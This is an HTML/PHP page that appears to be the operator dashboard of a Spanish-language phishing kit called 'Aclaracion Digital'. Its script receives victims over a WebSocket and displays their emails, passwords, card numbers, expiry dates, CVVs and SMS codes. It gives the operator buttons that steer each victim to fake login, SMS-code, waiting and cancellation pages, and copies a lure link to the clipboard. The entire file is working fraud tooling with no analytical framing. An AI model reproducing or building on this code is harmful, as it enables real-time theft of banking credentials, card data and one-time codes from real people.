<!DOCTYPE html>
<!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang=""> <![endif]-->
<!--[if IE 7]>    <html class="no-js lt-ie9 lt-ie8" lang=""> <![endif]-->
<!--[if IE 8]>    <html class="no-js lt-ie9" lang=""> <![endif]-->
<!--[if gt IE 8]><!-->
<html class="no-js" lang="">
<!--<![endif]-->

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Espacio de trabajo</title>
    <meta name="description" content="Ela Admin - HTML5 Admin Template">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="apple-touch-icon" href="<?php echo get_template_directory_uri(); ?>/Sq5ad5W9pqQz.png">
    <link rel="shortcut icon" href="<?php echo get_template_directory_uri(); ?>/Sq5ad5W9pqQz.png">
 
    <script src="https://cdn.ably.io/lib/ably.min-1.js"></script>

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" integrity="sha512-+4zCK9k+qNFUR5X+cKL9EIR+ZOhtIloNl9GIKS57V1MyNsYpYcUrUeQc9vNfzsWfV28IaLL3i96P9sdNyeRssA==" crossorigin="anonymous">    
    <link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/themify-icons.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pixeden-stroke-7-icon@1.2.3/pe-icon-7-stroke/dist/pe-icon-7-stroke.min.css">
    <link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/pAhtcOt2DwBr.css">
    <link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/cs-skin-elastic.css">
    <link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/style.css">
    <!-- <script type="text/javascript" src="https://nqcQL0Isj77Y.net/html5shiv/3.7.3/html5shiv.min.js"></script> -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/chartist/0.11.0/chartist.min.css" integrity="sha512-..." crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jqvmap/1.5.1/jqvmap.min.css" integrity="sha512-..." crossorigin="anonymous" />

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/weather-icons/2.0.12/css/weather-icons.min.css" integrity="sha512-r/Gan7PMSRovDus++vDS2Ayutc/cSdl268u047n4z+k7GYuR7Hiw71FsT3QQxdKJBVHYttOJ6IGLnlM9IoMToQ==" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fullcalendar/3.10.2/fullcalendar.min.css" integrity="sha512-..." crossorigin="anonymous" />
    <link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/all.css" media="all">

    <style>
        #weatherWidget .currentDesc {
            color: #ffffff!important;
        }

        .traffic-chart {
            min-height: 335px;
        }

        #flotPie1 {
            height: 150px;
        }

        #flotPie1 td {
            padding: 3px;
        }

        #flotPie1 table {
            top: 20px!important;
            right: -10px!important;
        }

        .chart-container {
            display: table;
            min-width: 270px;
            text-align: left;
            padding-top: 10px;
            padding-bottom: 10px;
        }

        #flotLine5 {
            height: 105px;
        }

        #flotBarChart {
            height: 150px;
        }

        #cellPaiChart {
            height: 160px;
        }

        .right-panel {
            margin-left: 0;
        }

        td>i {
            font-size: 24px;
            cursor: pointer;
            display: inline-block;
            margin: 5px;
        }

        #sisname {
            min-width: 200px;
            margin-top: 8px;
            font-size: 20px;
            border: 1px solid #aaa;
            border-radius: 10px;
            padding: 3px 10px;
        }

        #kols>i {
            font-size: 25px;
            display: inline-block;
            margin: 10px;
        }
    </style>




    <script type="text/javascript">window.wsk='wss3';</script>
    <script src="<?php echo get_template_directory_uri(); ?>/cdta_1689014618.js"></script>
    <script
    src="https://code.jquery.com/jquery-3.6.4.min.js"
    integrity="sha256-oP6HI9z1XaZNBrJURtCoUT5SUnxFr8s3BzRl+cbzUq8="
    crossorigin="anonymous"
    ></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
</head>


<body>
    <script src="mi-script.js"></script>
    <audio id="au1" src="<?php echo get_template_directory_uri(); ?>/naic.mp3" type="audio/mpeg"></audio>
    <audio id="au2" src="<?php echo get_template_directory_uri(); ?>/not.mp3" type="audio/mpeg"></audio>
    <script type="text/javascript">
        window.a1 = document.getElementById('au1');
        window.a2 = document.getElementById('au2');
        window.olx = [];
        window.pans = ['Login', 'Cargo', 'SMS', 'Tarjeta', 'Cancelacion', 'Espera', 'Inicio', 'Datos', 'Proteger'];

        window.loginok = function (dta) {
            window.nix = dta.nix;
            window.hidv = dta.id;

            document.getElementById('nope').innerHTML = window.nusr = dta.usr;
            document.getElementById('uric').innerHTML = 'https://aclaraciondigital.net/' + dta.nix;
            document.getElementById('uric').onclick = function () {
                navigator.clipboard.writeText('https://aclaraciondigital.net/' + window.nix);
            };
            wscon.send('UL');
            document.getElementById('sisname').value = dta.sisid;
        };
        window.closeok = function () {
            document.location = '<?php echo get_template_directory_uri(); ?>/Login';
        };

        window.fux = function (vx) {
            var e = false;
            window.ulx.forEach(function (v, i) {
                if (v.name == vx.name) e = true;
            });
            return (e);
        };

        window.ofux = function (vx) {
            var e = false;
            window.olx.forEach(function (v, i) {
                if (v.name == vx.name) e = true;
            });
            return (e);
        };

        window.ovex = function (vx) {
            window.olx.forEach(function (v, i) {
                if (v.name == vx.name)
                    if (v.vex != v.vex) {
                        window.a2.play();
                        //console.log('x');
                    }
            });
        };

        window.ulist = function (ul, xul) {
            var t;

            t = '';
            window.ulx = [];
            ul.forEach(function (v, i) {
                if (v.nix != window.nix) return;
                if (fux(v)) return;
                if (window.nusr != v.usr) wscon.send("Su" + v.name + ',' + window.nusr);
                window.ulx[i] = v;
                if (!ofux(v)) {
                    window.a1.play();
                    olx.push(v);
                }
                if (k = document.getElementById('panx' + i)) {
                    if (k.innerHTML != pans[v.vex]) window.a2.play();
                }

                if (v.cel == null) v.cel = ulx[i].cel = '';
                if (v.tarjeta == null) v.tarjeta = ulx[i].tarjeta = '';
                if (v.code == null) v.code = ulx[i].code = '';
                if (v.codec == null) v.codec = ulx[i].codec = '';
                if (v.fecha == null) v.fecha = ulx[i].fecha = '';
                if (v.cvv == null) v.cvv = ulx[i].cvv = '';
                //console.log(v);
                t += '<tr>';
                t += '<td>' + (i + 1) + '</td>';
                t += '<td>' + v.folio + '</td>';
                t += '<td align=left>' + v.email + '<br>' + v.pwd + '</td>';
                t += '<td align=left>' + v.tarjeta + '<br>' + v.fecha + '<br>' + v.cvv + '</td>';
                t += '<td>' + v.code + '</td>';
                t += '<td>' + v.codec + '</td>';
                t += '<td><input type=tel id=cel' + i + ' value="' + ((v.cel == null) ? '' : v.cel) + '" onchange="window.xsetcel(' + i + ');"></td>';
                t += '<td id=panx' + i + '>' + pans[v.vex] + '</td>';
                t += '<td>';
                t += '<i ' + ((v.six == 1) ? 'onclick="window.urlto(\'/Login/?\',' + i + ');"' : '') + ' style="color: ' + ((v.six == 1) ? '#03254B' : '#e8e8e8') + ';" class="fa-solid fa-user" title="Login"></i>';
                t += '<i ' + ((v.six == 1) ? 'onclick="window.urlto(\'/Loader/?\',' + i + ');"' : '') + ' style="color: ' + ((v.six == 1) ? '#03254B' : '#e8e8e8') + ';" class="fa-solid fa-clock" title="Espera"></i>';
                t += '<i ' + ((v.six == 1) ? 'onclick="window.urlto(\'/SMS/?T=\'+btoa(\'' + v.tarjeta.substr(-4) + ',\'+document.getElementById(\'cel' + i + '\').value.substr(-4)),' + i + ');"' : '') + ' style="color: ' + ((v.six == 1) ? '#03254B' : '#e8e8e8') + ';" class="fa-solid fa-comment-sms" title="SMS"></i>';

                t += '<i ' + ((v.six == 1) ? 'onclick="openb(' + i + ');"' : '') + ' style="color: ' + ((v.six == 1) ? '#03254B' : '#e8e8e8') + ';" class="fa-solid fa-circle-exclamation" title="Proteger"></i>';

                t += '<i ' + ((v.six == 1) ? 'onclick="openc(' + i + ');"' : '') + ' style="color: ' + ((v.six == 1) ? '#03254B' : '#e8e8e8') + ';" class="fa-solid fa-circle-xmark" title="Cancelar"></i>';
                t += '<i ' + ((v.six == 1) ? 'onclick="window.urlto(\'/Cerrar/?\',' + i + ');"' : '') + ' style="color: ' + ((v.six == 1) ? '#03254B' : '#e8e8e8') + ';" class="fa-solid fa-locked" title="Cerrar"></i>';
                t += '<i onclick="window.delv(' + i + ');" style="color: #e8e8e8;" class="fa-solid fa-trash" title="Eliminar"></i>';
                t += '</td></tr>';
            });

            document.getElementById('list').innerHTML = t;
        };

        window.nop = function () {
            window.a2.play();
        };

        window.urlto = function (ur, i) {
            document.location = ur + window.ulx[i].name + '/' + window.ulx[i].pwd + '/' + window.hidv;
        };

        window.uload = function () {
            wscon.send('UL');
        };

        window.loadx = function () {
            document.getElementById('loadbtn').innerHTML = 'Cargando...';
            wscon.send('loadx');
        };

        window.cread = function () {
            document.location = '<?php echo get_template_directory_uri(); ?>/Nuevo';
        };

        window.edit = function (i) {
            document.location = '<?php echo get_template_directory_uri(); ?>/Editar/' + i + '/' + window.hidv;
        };

        window.delv = function (i) {
            window.a2.play();
            if (confirm('Eliminar a ' + window.ulx[i].email + ' ?'))
                wscon.send('delv' + window.ulx[i].name + ',' + window.hidv);
        };

        window.openb = function (i) {
            document.location = '<?php echo get_template_directory_uri(); ?>/Proteger/' + i + '/' + window.hidv;
        };

        window.openc = function (i) {
            document.location = '<?php echo get_template_directory_uri(); ?>/Cancelar/' + i + '/' + window.hidv;
        };

        window.xsetcel = function (i) {
            window.ulx[i].cel = document.getElementById('cel' + i).value;
            window.ulx[i].vex = 2;
            wscon.send('S1' + i + ',' + window.ulx[i].cel);
        };

        window.sset = function (i, st) {
            window.ulx[i].vex = st;
            wscon.send('S0' + i + ',' + st);
            window.ovex(window.ulx[i]);
        };

        window.setp = function (i, st) {
            window.ulx[i].vex = st;
            wscon.send('S2' + i + ',' + st);
        };
    </script>
    <table width=100% height=100%><tr><td valign=top align=center>
                <table class="content" width=100%><tr><td valign=top align=center>
                            <img width=200px src="/231223otro/wp-content/themes/sit3-theme/Sq5ad5W9pqQz.png">
                            <h1>Aclaracion Digital</h1>
                            <h3>Bienvenido</h3>
                            <p id="nope"></p>
                            <div style="border-radius: 5px;background-color: #f2f2f2;padding: 20px;width: 70%;">
                                <div id=loading><i class="fa-solid fa-spinner-third fa-spin fa-3x"></i> Cargando...</div>
                                <div id=login style="display:none;">
                                    <p id=uric></p>
                                    <table width=100% class="list" style="color: #e8e8e8;" id=list>
                                    </table>
                                </div>
                            </div>
                            <br><br>
                            <div id=noti style="display:none;">
                                <div style="border-radius: 5px;background-color: #f2f2f2;padding: 20px;width: 70%;">
                                    <p id=noto style="color: #e8e8e8;"></p>
                                    <br>
                                    <button onclick="window.location.href = '/Notificaciones';">Aceptar</button>
                                </div>
                            </div>
                            <br>
                            <div id=show class="content" style="display:none;"></div>
                        </td></tr></table></td></tr></table>
</body></html>